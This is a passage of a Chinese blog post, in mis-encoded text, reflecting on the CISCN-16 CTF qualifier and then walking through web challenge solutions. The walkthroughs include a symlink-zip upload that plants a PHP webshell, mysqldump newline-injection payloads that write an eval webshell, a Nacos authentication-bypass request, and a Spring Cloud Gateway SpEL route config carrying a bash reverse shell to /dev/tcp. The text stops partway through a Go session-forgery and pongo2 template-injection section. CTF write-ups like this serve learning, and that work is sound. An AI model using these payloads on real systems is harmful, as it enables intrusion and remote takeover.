[{"title":"CISCN-16 å›½èµ›åˆèµ›åçš„å¤ç°ä»¥åŠä¸€äº›æ„Ÿæ‚Ÿ","url":"/post/5cb82439.html","content":"\nCISCN-16\n\n<!--more-->\n\n# æ„Ÿæ‚Ÿä»¥åŠæƒ³æ³•\n\nä¸å‡ºæ„å¤–ï¼Œå›½èµ›åˆèµ›è¿˜æ˜¯ä¸€é“é¢˜éƒ½æ²¡æœ‰åšå‡ºæ¥ï¼Œæœ‰å¤ªå¤šçŸ¥è¯†æˆ‘è¿˜æ²¡æœ‰å»æŒæ¡ï¼Œæœ‰å¤ªå¤šé¢˜ç›®æˆ‘è¿˜æ²¡æœ‰å»åšï¼Œèµ›å‰æ€»æ˜¯æ»¡è…”çƒ­è¡€æ€»æƒ³å¤§å¹²ä¸€ç•ªï¼Œä½†æ˜¯æ€»æ˜¯ä¸€é“é¢˜ç›®éƒ½åšä¸å‡ºæ¥ï¼ŒæŠ‘éƒä¸€ä¸‹åˆã€‚\n\næ¯æ¬¡æ¯”èµ›ç»“æŸçœ‹äº†wpæ€»æ˜¯è¯´å“ªä¸ªå“ªä¸ªé¢˜ç›®çœŸç®€å•ï¼Œå¤ªå¯æƒœäº†ï¼Œä½†æ˜¯ï¼Œäº‹å®çœŸæ˜¯å¦‚æ­¤å—ã€‚\n\nä»€ä¹ˆæ˜¯éš¾é¢˜ï¼Ÿ\n\næˆ‘è®¤ä¸ºè¿™ä¸ªé—®é¢˜å…·æœ‰ç›¸å¯¹æ€§ï¼Œç›¸å¯¹äºäººï¼Œä¹Ÿç›¸å¯¹äºæ—¶ç©ºã€‚\n\nç›¸å¯¹äºäººï¼šä¸€é“é¢˜ç›®ï¼Œå¦‚æœå¯¹äºçŸ¥è¯†å‚¨å¤‡é‡å¤šçš„äººè€Œè¨€ï¼Œè§å¤šè¯†å¹¿ï¼Œåˆ™åœ¨å®¡é¢˜ä¸­åˆ™ä¼šå‘ç°ç«¯å€ªï¼Œç”šè‡³æ˜¯ä¸€çœ¼ä¸çœŸï¼Œè€Œå¯¹äºä¸€ä¸ªçŸ¥è¯†å‚¨å¤‡é‡å¹¶ä¸æ˜¯å¾ˆå……è¶³çš„äººæ¥è¯´ï¼Œå¯èƒ½æ‹¿åˆ°é¢˜ç›®å¹¶ä¸èƒ½æ‰¾åˆ°ä»–çš„è€ƒç‚¹ï¼Œç”šè‡³æ˜¯å››å¤„ä¹±æ’ï¼Œè€Œæˆ‘ï¼Œåœ¨è¿™æ¬¡æ¯”èµ›ä¸­å°±æ˜¯å¦‚æ­¤ï¼Œä¸€é“é¢˜ç›®ä¸çŸ¥é“ä»–çš„è€ƒç‚¹å°±ä¼šæ ¹æ®æˆ‘èƒ½æ•æ‰åˆ°åˆ°çš„æˆ–è€…æ˜¯é¢˜ç›®æ³„éœ²å‡ºæ¥ä»…æœ‰çš„ä¿¡æ¯å»é€ä¸ªé€ä¸ªæ£€ç´¢ï¼Œå¯èƒ½è¿æ°”å¥½ä¼šæ£€ç´¢å‡ºæ¥ï¼Œä½†æ˜¯å¤±è´¥æ€»æ˜¯æ¥å¾—æ›´åŠ é¢‘ç¹ã€‚\n\nç›¸å¯¹äºæ—¶ç©ºï¼šæˆ‘ä¼šæˆé•¿ï¼Œåšé¢˜äº¦å¦‚æ­¤ã€‚ä¸€é“ç°åœ¨åšä¸å‡ºæ¥çš„é¢˜ç›®ï¼Œä¹‹åå»è®¤çœŸå­¦ä¹ ä»¥åŠå›é¡¾ï¼Œé‚£ä¹ˆå½“ä¹‹åå†é‡åˆ°æ­¤ç±»å‹çš„é¢˜ç›®æ—¶å€™å°±ä¸è‡³äºä¸€å¤´é›¾æ°´ã€‚\n\né‚£ä¹ˆéš¾é¢˜ï¼Œå°±æˆ‘è‡ªå·±çš„çœ‹æ³•ï¼Œåœ¨æ¯”èµ›ä¸­åšä¸å‡ºæ¥çš„é¢˜ç›®åˆ™å°±æ˜¯éš¾é¢˜ï¼Œå½“ç„¶è¿™æ˜¯å­˜åœ¨å‰æï¼Œä¸€äº›äººä¸ºå¯¼è‡´çš„å‰æï¼Œæ¯”å¦‚ç”±äºå‡ºé¢˜äººçš„ä¸ä¸¥è°¨å¯èƒ½ä¸€é“å¾ˆç®€å•çš„è€ƒç‚¹ç¡¬æ˜¯è¦é€šè¿‡å»çŒœçš„æ–¹å¼æ‰èƒ½åšå‡ºæ¥ï¼Œæˆ–è€…å¤¹æ‚ç€å‡ºé¢˜äººè‡ªèº«è‰²å½©çš„é¢˜ç›®ï¼Œé¢˜ç›®ç»ˆå½’æ˜¯è¦å›å½’äºå¤§ä¼—ï¼Œé‚£ä¹ˆå—ä¼—ç¾¤ä½“åº”è¯¥æ˜¯åšé¢˜çš„äººï¼Œå¦‚æœé€šè¿‡å…ˆå»äº†è§£å‡ºé¢˜äººå†å»äº†è§£é¢˜ç›®ï¼Œè¿™å°±æœ‰ç‚¹æœ¬æœ«å€’ç½®äº†ï¼ˆè¿™é‡Œä¸»è¦æ˜¯æŒ‡WEBæ–¹å‘ï¼Œä¸ç¤¾å·¥ç›¸å¼‚ï¼‰ã€‚\n\næ‰€ä»¥çº¯æ˜¯çœ‹äº†WPè€Œè®¤ä¸ºæ˜¯ç®€å•é¢˜çš„ï¼Œå¯èƒ½åªæ˜¯é¢˜ç›®å¤æ‚åº¦æ¯”è¾ƒå°ï¼Œé™Œç”Ÿç¨‹åº¦æ¯”è¾ƒä½ï¼Œä½†æ˜¯æ€»å½’ æ¯”èµ›ä¸­åšä¸å‡ºæ¥çš„é¢˜ç›®é‚£å°±æ˜¯å¯¹äºè‡ªèº«çš„éš¾é¢˜ã€‚\n\nå†æ¥è°ˆè°ˆPY\n\nè¿™æ¬¡å›½èµ›PYç¨‹åº¦å ªç§°è®©æˆ‘ç ç›®ç»“èˆŒï¼Œå³ä¾¿åœ¨æˆ‘èº«è¾¹ä¹Ÿå­˜åœ¨ã€‚\n\nå½“ç„¶ï¼Œæˆ‘ä¹Ÿå­˜åœ¨ã€‚\n\næˆ‘æ€»æ˜¯åœ¨ä¸€äº›æ¯”èµ›ä¸­ï¼Œåšé¢˜åšç€åšç€ï¼Œçªç„¶å°±æ²¡äº†æ€è·¯ï¼Œç„¶åå°±æƒ³é—®é—®å…¶ä»–äººä¸€äº›æ€è·¯ï¼Œæ€»æ˜¯æƒ³ç€ä¹Ÿè®¸æˆ‘è·å–ä¸€ç‚¹å¸®åŠ©å°±èƒ½åšå‡ºæ¥å‘¢ï¼ˆå› ä¸ºæˆ‘è¿™ä¸ªäººæ€»æ˜¯æ¯”è¾ƒçˆ±é’»ç‰›è§’å°–ï¼Œæœ‰æ—¶å€™ä¼šåœ¨ä¸€äº›æ²¡æ„ä¹‰çš„åœ°æ–¹åœç•™å¾ˆä¹…ï¼‰ï¼Œå…¶å®æˆ‘è®¤ä¸ºè¿™ç§åªæ˜¯è·å–ä¸€ç‚¹æ€è·¯çš„å¸®åŠ©ï¼Œè™½ç„¶ä¸å¯¹ï¼Œä½†æ˜¯ä¸ä¼šå¾ˆæ¶åŠ£ï¼Œä»–å…·æœ‰ä¸€å®šçš„ç§¯ææ€§è´¨ï¼Œå¯èƒ½é€šè¿‡å¯»æ±‚ä¸€ç‚¹æ€è·¯å°±æŠŠè¿™é“é¢˜ç›®åšå‡ºæ¥ï¼Œé‚£ä¹ˆæ­£å‘åé¦ˆæ˜¯å¾ˆå®¢è§‚çš„ã€‚ç›¸æ¯”äºæ›´ä¸ºå—äººå”¾å¼ƒçš„åˆ™æ˜¯ï¼Œä¸€ç‚¹ä¸äº†è§£é¢˜ç›®ç”šè‡³æ˜¯æ²¡æœ‰ä»”ç»†å®¡é¢˜ï¼Œç›´æ¥å»PYåšæ³•çš„ï¼Œæˆ‘è§‰å¾—è¿™ç§è¡Œä¸ºåšæ³•å¹¶æ²¡æœ‰ä¸€ç‚¹å®é™…æ„ä¹‰ï¼Œæœ¬æ¥CTFå°±æ˜¯ä»¥èµ›ä¿ƒå­¦ï¼Œæœ€ç»ˆç›®çš„æ˜¯æŒæ¡è¿™ä¸ªçŸ¥è¯†ï¼Œè€Œä¸æ˜¯æ’åï¼Œå½“ç„¶éšç€å•†ä¸šåŒ–æ¨¡å¼çš„ä¾µèš€ä¸åœ¨å½“ä»Šç¤¾ä¼šä¸‹æµ®èºçš„å¿ƒæ€ï¼Œé™ä¸‹å¿ƒæ¥å­¦ä¹ æ˜¯ä¸€ä»¶éš¾èƒ½å¯è´µçš„äº‹æƒ…ã€‚\n\nä¸¾ä¸ªç®€å•çš„ä¾‹å­æ¯”å¦‚Flaskçš„SSTIï¼Œpayloadæœ‰å¾ˆå¤šï¼Œä¸€å¼€å§‹æˆ‘è®¤ä¸ºç›´æ¥ç”¨ä¸€ä¸ªè„šæœ¬å»æ³¨å…¥ï¼Œä¸æ˜¯å¾ˆæ–¹ä¾¿å¾ˆç®€å•å˜›ï¼Œä½†æ˜¯å¦‚æœé¢˜ç›®ç¨ç¨å˜åŠ¨ï¼Œé‚£ä¹ˆè„šæœ¬çš„å±€é™æ€§è´¨å°±ä¼šä½“ç°å‡ºæ¥ï¼Œæ¯•ç«Ÿè„šæœ¬æ˜¯äººä¸ºæå‰ç¼–è¯‘å¥½çš„ï¼Œé¢˜ç›®ç¨ç¨æ”¹åŠ¨åŠ ä¿®æ”¹å°±ä¼šè®©è„šæœ¬æ— æ³•ç”¨ã€‚å½“ç„¶ï¼Œå¯¹äºå·²ç»æŒæ¡äº†è¿™ä¸ªçŸ¥è¯†çš„å¤§ä½¬ï¼Œé€šè¿‡è„šæœ¬å®ç°ä¸€äº›å¯¹ä»–è€Œè¨€æ— æ„ä¹‰çš„æœºæ¢°é‡å¤å¼çš„æ“ä½œï¼Œä¹Ÿæ˜¯æ²¡æ¯›ç—…çš„ï¼Œæ¯•ç«Ÿå¤§ä½¬ä¼šï¼Œåªæ˜¯ä¸€ä¸ªåšä¸ä¸åšçš„é—®é¢˜ã€‚è€Œå¯¹æˆ‘ï¼Œå¹¶æ²¡æœ‰ç†Ÿç»ƒçš„æŒæ¡ï¼Œå´é€è¿‡è„šæœ¬å¹²ä¸€äº›æœ¬æœ«å€’ç½®çš„äº‹æƒ…æ˜¯æ¯«æ— æ„ä¹‰çš„ã€‚\n\næœ€åï¼Œæˆ‘è®¤ä¸ºwebæ˜¯ä¸€ä¸ªéœ€è¦æ²‰æ·€çš„æ–¹å‘ï¼Œä»–éœ€è¦å¤§é‡çš„åŸºç¡€åŠŸåº•ä»¥åŠè¯­è¨€åŠŸåº•ï¼Œæˆ‘åªæ˜¯ä¸€ä¸ªæ™®é€šäººæ— æ³•åšåˆ°çŸ­æ—¶é—´å°±èƒ½æ‹¿åˆ°æˆ‘è‡ªå·±è®¤ä¸ºæœ‰ä»·å€¼çš„æ’åä¹Ÿå¥½ï¼Œå¥–é¡¹ä¹Ÿå¥½ï¼Œåªèƒ½è¯´ä»»é‡è€Œé“è¿œã€‚\n\nä»¥ä¸Šåªæ˜¯æˆ‘å•æ–¹é¢çš„èµ›åæƒ³æ³•ä»¥åŠæ€»ç»“ï¼Œåªæ˜¯ç”¨æ¥é­ç­–ä¸æé†’æˆ‘è‡ªå·±ä¸å¿˜åˆå¿ƒï¼Œå¸Œæœ›æœªæ¥èƒ½æ›´å¥½ã€‚\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685547094038-d6d9bea7-62c7-47b3-830a-1b9ac0671965.jpeg)\n\n# WEB\n\n## UNZIP\n\nè€ƒç‚¹ï¼šè½¯é“¾æ¥\n\nè¿™æ˜¯ä¸€é“2021æ·±è‚²æ¯çš„åŸé¢˜  https://xz.aliyun.com/t/10533#toc-4\n\né¦–å…ˆæ˜¯ä¸€ä¸ªä¸Šä¼ æ–‡ä»¶\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685371919081-97f89941-b813-493c-a0a6-dc9c9cd10df2.png)\n\nä¹‹åç»™äº†æºç ï¼š\n\n```php\n<?php\nerror_reporting(0);\nhighlight_file(__FILE__);\n\n$finfo = finfo_open(FILEINFO_MIME_TYPE);\nif (finfo_file($finfo, $_FILES[\"file\"][\"tmp_name\"]) === 'application/zip'){\n    exec('cd /tmp && unzip -o ' . $_FILES[\"file\"][\"tmp_name\"]);\n};\n```\n\nåˆ†ææºç  æˆ‘ä»¬ä¸Šä¼ ä¸Šå»çš„å‹ç¼©åŒ…ä¼šè¢«ä¿®æ”¹ä¸ºtmp_name å¹¶ä¸”è·¯å¾„æ˜¯/tmpæˆ‘ä»¬ä¹Ÿæ˜¯è®¿é—®ä¸åˆ°çš„\n\næˆ‘ä»¬èƒ½è®¿é—®åˆ°çš„åªèƒ½æ˜¯é»˜è®¤webç¯å¢ƒä¸‹ ä¹Ÿå°±æ˜¯/var/www/html\n\nå†æ ¹æ®é¢˜ç›®æè¿°æ˜¯unzipæ‰€å¯¼è‡´çš„é—®é¢˜ \n\nçœ‹äº†wp æ˜¯æ ¹æ®è½¯é“¾æ¥è¿™é‡Œå¯ä»¥ç†è§£ä¸ºæ˜¯winçš„å¿«æ·æ–¹å¼\n\nå…ˆæ¥çœ‹`unzip -o`è¿™æ˜¯è¿™é“é¢˜çš„å‰æ\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685372533414-f6c6b521-1d9d-43f8-bafc-f94ea40e22d0.png)\n\næˆ‘ä»¬èƒ½å¤Ÿé€šè¿‡è§£å‹è¦†ç›–åŸæœ‰çš„æ–‡ä»¶\n\næˆ‘ä»¬å¯ä»¥å…ˆåˆ›å»ºä¸€ä¸ªè½¯é“¾æ¥æ–‡ä»¶test æŒ‡å‘/var/www/html ç„¶åæ‰“åŒ…test.zipä¸Šä¼ ä¸Šå»\n\n `ln -s /var/www/html test`\n\n\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685373327803-af16dd07-a6f5-4219-a6ae-1f78d17dc4ab.png)\n\nè¿™é‡Œçš„**ç¬¦å·é“¾æ¥å…¶å®å°±æ˜¯è½¯é“¾æ¥**\n\n```\nzip -y test.zip test\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685373416181-10436723-6c28-4452-9cb2-34facb735c6b.png)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685373504644-d86c7ed4-d3ef-4c2e-a63b-39aa142ffbca.png)\n\nå†å†™ä¸€ä¸ªä¸€å¥è¯æœ¨é©¬ æ”¾åˆ°testæ–‡ä»¶ä¸­ æ‰“åŒ…test2.zipä¸Šä¼ ä¸Šå»\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685373611970-09deda72-3b51-43b9-91d3-f689aed9ad94.png)\n\n```\nzip -r test2.zip test\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685373698097-122e454b-4967-4295-a0d2-e6d4097fda8f.png)\n\nå› ä¸ºæ˜¯testæ–‡ä»¶ä¸‹æœ‰ä¸ªtest.phpï¼ˆæˆ‘ä»¬çš„æœ¨é©¬ï¼‰ æ‰€ä»¥è¦é€’å½’å¤„ç†\n\nå½“test.zipè¢«è§£å‹å ä¼šæœ‰ä¸€ä¸ªæŒ‡å‘/var/www/html çš„è½¯é“¾æ¥æ–‡ä»¶test ç„¶åæ¥ç€test2.zipè¢«è§£å‹å åŒåè½¯é“¾æ¥æ–‡ä»¶test ä¼šè¢«è¦†ç›–ç„¶å  ä½†æ˜¯testç›®å½•è½¯é“¾æ¥æŒ‡å‘/var/www/html è§£å‹çš„æ—¶å€™ä¼šæŠŠtestæ–‡ä»¶ä¸­çš„test.phpæ”¾åœ¨/var/www/htmlï¼Œæ­¤æ—¶æˆ‘ä»¬è¾¾åˆ°äº†getsehllçš„ç›®çš„ï¼Œè¿™é‡Œæ€è·¯ä¸€å®šè¦æ‹æ¸…ã€‚\n\nç„¶åè®¿é—®`/test.php`å³å¯\n\n## dumpit\n\nä¸€é“mysqldump rceçš„é¢˜ç›® è·Ÿsqlæ³¨å…¥æ²¡ä¸€ç‚¹å…³ç³» é¢˜ç›®ä¸­ä¹Ÿæç¤ºäº† rce \n\næˆ‘åƒä¸ªé“¸å¸ä¸€æ ·ä¸€ç›´åœ¨è¯•é—­åˆæ–¹å¼å»æ„é€ å¥‡æ€ªçš„æ³¨å…¥ç‚¹ æˆ‘è„‘å­æœ‰é—®é¢˜æ˜¯å§\n\n### éé¢„æœŸ\n\nå…¶å®è¿™é“é¢˜ç›®å¯¹æˆ‘æ¥è¯´rceç‚¹æˆ‘æ‰¾ä¸åˆ° è¿™æ˜¯ä¸€ä¸ªè§å¤šè¯†å¹¿çš„ç»“æœ\n\næ ¹æ®å¤§ä½¬çš„wp dumpå‡ºæ—¥å¿—å…¶å®æ˜¯é€šè¿‡å‘½ä»¤æ‰§è¡Œå®ç°çš„ ï¼Œæˆ‘ä»¬çœ‹çš„é‚£ä¸ªæ—¥å¿—åŠŸèƒ½å¤§æ¦‚ç‡ä¸æ˜¯æ—¥å¿—ï¼Œè€Œæ˜¯mysqldumpè¿™ä¸ªå·¥å…·ç”¨æ¥å¤‡ä»½æ•°æ®åº“çš„ï¼Œæ‰€ä»¥è¿™é‡Œåº”è¯¥ç›´æ¥æ‰§è¡Œçš„ç¨‹åºå‘½ä»¤ï¼Œæ‰€ä»¥èƒ½æ¢è¡Œç¬¦RCE \n\né€šè¿‡æ¢è¡Œç¬¦`%0a`ç»•ä¸€ä¸‹\n\nç„¶åç›´æ¥rce å¦‚æœç›´æ¥è¯»flagæ˜¯ä¸è¡Œçš„ ä¼°è®¡é¢„æœŸè§£è¦æ¶‰åŠææƒé—®é¢˜ \n\nä½†æ˜¯å‡ºé¢˜äººè¿™é‡Œæ²¡æœ‰æŠŠç¯å¢ƒå˜é‡åˆ äº† å¯¼è‡´ç›´æ¥è¯»ç¯å¢ƒå˜é‡å°±å‡ºäº†\n\n```\n?db=ctf&table_2_dump=%0Aenv\n```\n\nè¿˜æœ‰å¦ä¸€ç§æ˜¯\n\n```\n?db=ctf&table_2_dump=flag1%0aecho \"<?php @eval(getallheaders()['Cookie'])?>\" > \"/app/log/1.php\"\n```\n\nè¿™é‡Œè¿‡æ»¤äº†`$`å¯ä»¥é€šè¿‡`getallheaders()`æˆªå–è¯·æ±‚å¤´æ–¹å¼bypass\n\nè¿™ç§åšæ³•å…¶å®æˆ‘æœ€æƒ³é—®è¿™ä¸ª/app/logè·¯å¾„æ˜¯æ€ä¹ˆæ¥çš„ \n\næˆ‘å½“æ—¶åšé€šè¿‡æŠ¥é”™åªèƒ½è·å–çš„è·¯å¾„åªæœ‰`/log`\n\n## BackendService\n\nè€ƒç‚¹ï¼šä¸€é“ç»“åˆèº«ä»½è®¤è¯ç»•è¿‡å’ŒNacosç»“åˆSpring Cloud Gateway RCEåˆ©ç”¨çš„é¢˜ç›® \n\né¦–å…ˆæ˜¯Nacosèº«ä»½è®¤è¯ç»•è¿‡æ¼æ´ å‚è€ƒhttps://www.secpulse.com/archives/199642.html\n\nè¿™é“é¢˜ç›®å¤ç°ç¯å¢ƒæ˜¯åœ¨ctfshowä¸‹ å½“æ—¶å›½èµ›èº«ä»½è®¤è¯ç»•è¿‡å‚è€ƒçš„æ˜¯https://www.secpulse.com/archives/199642.html\n\nè¿™é‡Œç¨ç¨ä¸åŒ\n\nè¯·æ±‚åŒ…å¦‚ä¸‹ï¼š\n\n```php\nPOST /v1/auth/users HTTP/1.1\nHost: 9b464143-e8ce-4ca3-a70c-25ee32dc6c66.challenge.ctf.show\nContent-Length: 27\nAccept: application/json, text/plain, */*\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36\nContent-Type: application/x-www-form-urlencoded\nOrigin: http://9b464143-e8ce-4ca3-a70c-25ee32dc6c66.challenge.ctf.show\nReferer: http://9b464143-e8ce-4ca3-a70c-25ee32dc6c66.challenge.ctf.show/\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nCookie: _ga=GA1.2.729509020.1680361470\nConnection: close\n\nusername=test&password=test\n```\n\nä¹‹åæ¥åˆ°åå°\n\næ¥ç€å°±æ˜¯è·Ÿç€https://xz.aliyun.com/t/11493#tocå¤ç° åŠ¨æ€é…ç½®è·¯ç”±è¾¾åˆ°RCE\n\næ·»åŠ ä¸€ä¸ªé…ç½®\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685460978092-86e17559-963c-4cee-8180-0b9b65121836.png)\n\nè¿™é‡Œæ·»åŠ æ—¶Data ID è¦æ ¹æ®é¢˜ç›®ç»™çš„é™„ä»¶ å»æŸ¥çœ‹javaæºç \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685461072802-d7056ff3-982c-4bb1-b1e6-d09e4c1a63c3.png)\n\né…ç½®å†…å®¹å‚è€ƒå‰é¢æ–‡ç« ä¸­çš„ \n\n```yaml\nspring:\n  cloud:\n    gateway:\n      routes:\n        - id: exam\n          order: 0\n          uri: lb://service-provider\n          predicates:\n            - Path=/echo/**\n          filters:\n            - name: AddResponseHeader\n              args:\n                name: result\n                value: \"#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{'id'}).getInputStream())).replaceAll('\\n','').replaceAll('\\r','')}\"\n```\n\nä½†æ˜¯æ ¼å¼è¦è½¬ä¸ºjsonæºç ä¸­ä¹Ÿæåˆ°äº†\n\næ³¨æ„è¿™é‡ŒåŸæ–‡ç« ç»™çš„payloadæ ¼å¼æ˜¯yaml æ ¹æ®æºç éœ€è¦jsonæ ¼å¼ æ‰¾ä¸ªåœ¨çº¿ç½‘ç«™è½¬ä¸€ä¸‹æ ¼å¼å³å¯\n\nè¿™é‡Œæˆ‘ä¸€å¼€å§‹è¿™ä¸ªpayload æ ¼å¼ çœ‹æ¥çœ‹å»éš¾é“è¦æ‰‹åŠ¨è½¬jsonæ ¼å¼å— äºè´¼ï¼Œè€Œä¸”è¿™ä¸ªæ ¼å¼å¥½çœ¼ç†Ÿï¼Œä¹‹åå¥½å¥½æƒ³äº†ä¸€ä¸‹åŸæ¥æ˜¯çœèµ›çš„æ—¶å€™å‘¢åˆ°yamlååºåˆ—åŒ– å­¦è¿‡è¿™ä¸ªæ ¼å¼ æˆ‘å°±è¯´æ ¼å¼å¥½çœ¼ç†Ÿå•Š\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685461002172-6b4caeae-7103-4aa0-ac22-28ae200aba08.png)\n\n```json\n{\n  \"spring\":{\n    \"cloud\":{\n      \"gateway\":{\n        \"routes\":[\n          {\n            \"id\":\"exam\",\n            \"order\":0,\n            \"uri\":\"lb://backendservice\",\n            \"predicates:\":[\n              \"Path=/test/**\"\n            ],\n            \"filters\":[\n              {\n                \"name\":\"RewritePath\",\n                \"args\":{\n                  \"replacement\":\"#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{'bash','-c','bash -i >& /dev/tcp/ip/port 0>&1'}).getInputStream())).replaceAll('\\n','').replaceAll('\\r','')}\"\n                }\n              }\n            ]\n          }\n        ]\n      }\n    }\n  }\n}\n```\n\nåå¼¹shell å³å¯  ä½†æ˜¯æœ‰æ—¶å€™å¼¹ä¸æˆåŠŸ ç¯å¢ƒé—®é¢˜\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685462609893-09c39cf1-624e-4597-8b3b-9751bc72f3e6.png)\n\n\n\n## go_session\n\næºç å¦‚ä¸‹ï¼š\n\n```go\npackage route\n\nimport (\n    \"github.com/flosch/pongo2/v6\"\n    \"github.com/gin-gonic/gin\"\n    \"github.com/gorilla/sessions\"\n    \"html\"\n    \"io\"\n    \"net/http\"\n    \"os\"\n)\n\nvar store = sessions.NewCookieStore([]byte(os.Getenv(\"SESSION_KEY\")))\n\nfunc Index(c *gin.Context) {\n    session, err := store.Get(c.Request, \"session-name\")\n    if err != nil {\n        http.Error(c.Writer, err.Error(), http.StatusInternalServerError)\n        return\n    }\n    if session.Values[\"name\"] == nil {\n        session.Values[\"name\"] = \"guest\"\n        err = session.Save(c.Request, c.Writer)\n        if err != nil {\n            http.Error(c.Writer, err.Error(), http.StatusInternalServerError)\n            return\n        }\n    }\n\n    c.String(200, \"Hello, guest\")\n}\n\nfunc Admin(c *gin.Context) {\n    session, err := store.Get(c.Request, \"session-name\")\n    if err != nil {\n        http.Error(c.Writer, err.Error(), http.StatusInternalServerError)\n        return\n    }\n    if session.Values[\"name\"] != \"admin\" {\n        http.Error(c.Writer, \"N0\", http.StatusInternalServerError)\n        return\n    }\n    name := c.DefaultQuery(\"name\", \"ssti\")\n    xssWaf := html.EscapeString(name)\n    tpl, err := pongo2.FromString(\"Hello \" + xssWaf + \"!\")\n    if err != nil {\n        panic(err)\n    }\n    out, err := tpl.Execute(pongo2.Context{\"c\": c})\n    if err != nil {\n        http.Error(c.Writer, err.Error(), http.StatusInternalServerError)\n        return\n    }\n    c.String(200, out)\n}\n\nfunc Flask(c *gin.Context) {\n    session, err := store.Get(c.Request, \"session-name\")\n    if err != nil {\n        http.Error(c.Writer, err.Error(), http.StatusInternalServerError)\n        return\n    }\n    if session.Values[\"name\"] == nil {\n        if err != nil {\n            http.Error(c.Writer, \"N0\", http.StatusInternalServerError)\n            return\n        }\n    }\n    resp, err := http.Get(\"http://127.0.0.1:5000/\" + c.DefaultQuery(\"name\", \"guest\"))\n    if err != nil {\n        return\n    }\n    defer resp.Body.Close()\n    body, _ := io.ReadAll(resp.Body)\n\n    c.String(200, string(body))\n}\n```\n\nçœ‹äº†æºç å‘ç°è¦è¿›è¡Œsessionä¼ªé€ ï¼Œå½“æ—¶åšé¢˜çš„æ—¶å€™ä»¥ä¸ºç±»ä¼¼äºfalskçš„sessionä¼ªé€  å»ç½‘ä¸Šæ‰¾è„šæœ¬ ä½†æ˜¯éƒ½æ²¡è¿è¡ŒæˆåŠŸ å¹¶ä¸”ä¹Ÿä¸çŸ¥é“key å°±å¯„äº†\n\nå¤ç°çš„æ—¶å€™çœ‹äº†å¤§ä½¬çš„WP keyæ˜¯ç©ºå€¼ éº»äº† è¿™é‡Œå°±éœ€è¦æœ¬åœ°æ¥æ­å»ºä¸€ä¸‹ æ­¤å‰é›¶æ¥è§¦go æ‰€ä»¥æ­å»ºå¾ˆè´¹åŠ› è¯·äº†äº®senseiå¸®æˆ‘å¼„ \n\næ­å»ºå¥½æœ¬åœ°ç¯å¢ƒä¹‹å \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685710841251-127825a0-1f2b-400c-bda0-f3588de2f64d.png)\n\nä¿®æ”¹è¿™ä¸¤ä¸ªåœ°æ–¹ æœ¬åœ°å¯åŠ¨æŠ“åŒ… å°†session å¤åˆ¶åˆ°é¢˜ç›®ä¸Šå»ç›´æ¥å°±å¯ä»¥äº†ï¼ˆè¿™é‡Œæ³¨æ„è¦åˆ é™¤åŸæ¥çš„session ç„¶ååˆ·æ–°ä¸€ä¸‹ï¼‰\n\n```\nMTY4NTcwODk3NnxEdi1CQkFFQ180SUFBUkFCRUFBQUlfLUNBQUVHYzNSeWFXNW5EQVlBQkc1aGJXVUdjM1J5YVc1bkRBY0FCV0ZrYldsdXxfaogJnkxqBjr0zeT-y8vTmXMwFnxOaUC4_0fBoWEhUA==\n```\n\nç„¶åå°±æœ‰ä¸¤ä¸ªæ¥å£`/admin``/flask`\n\nå›½èµ›ç¯å¢ƒä¸‹å½“æ—¶`/flask?name=/`å°±ä¼šæŠ¥é”™ æŠ¥é”™ç•Œé¢æš´éœ²å¯ä»¥ç®—pinç ï¼Œä¹Ÿå°±æ˜¯debugå¼€å¯çš„ï¼Œä½†æ˜¯è¿™é“é¢˜ç›®æ²¡æ³•é€šè¿‡ç®—pinç æ¥åšå‡ºæ¥ çœ‹äº®å¸ˆå‚…wpæ˜¯å› ä¸ºè¿™é“é¢˜ç›®å¯ä»¥æ–‡ä»¶çƒ­éƒ¨ç½²ï¼ˆä¹Ÿå°±æ˜¯ä¸ç”¨é€šè¿‡é‡æ–°ç¼–è¯‘æ¥è¾¾åˆ°æ›´æ–°ç›®çš„ åå°ç›´æ¥ä¿®æ”¹æ›´æ–°å³å¯ï¼‰\n\nå†æ¥çœ‹`/admin`\n\n```go\nfunc Admin(c *gin.Context) {\n\tsession, err := store.Get(c.Request, \"session-name\")\n\tif err != nil {\n\t\thttp.Error(c.Writer, err.Error(), http.StatusInternalServerError)\n\t\treturn\n\t}\n\tif session.Values[\"name\"] != \"admin\" {\n\t\thttp.Error(c.Writer, \"N0\", http.StatusInternalServerError)\n\t\treturn\n\t}\n\tname := c.DefaultQuery(\"name\", \"ssti\")\n\txssWaf := html.EscapeString(name)\n\ttpl, err := pongo2.FromString(\"Hello \" + xssWaf + \"!\")\n\tif err != nil {\n\t\tpanic(err)\n\t}\n\tout, err := tpl.Execute(pongo2.Context{\"c\": c})\n\tif err != nil {\n\t\thttp.Error(c.Writer, err.Error(), http.StatusInternalServerError)\n\t\treturn\n\t}\n\tc.String(200, out)\n}\n```\n\n`tpl, err := pongo2.FromString(\"Hello \" + xssWaf + \"!\")`ç›´æ¥æ¥çœ‹è¿™é‡Œ å°±æ˜¯æ¨¡æ¿æ³¨å…¥pongo2çš„æ¨¡æ¿æ³¨å…¥\n\n```\nout, err := tpl.Execute(pongo2.Context{\"c\": 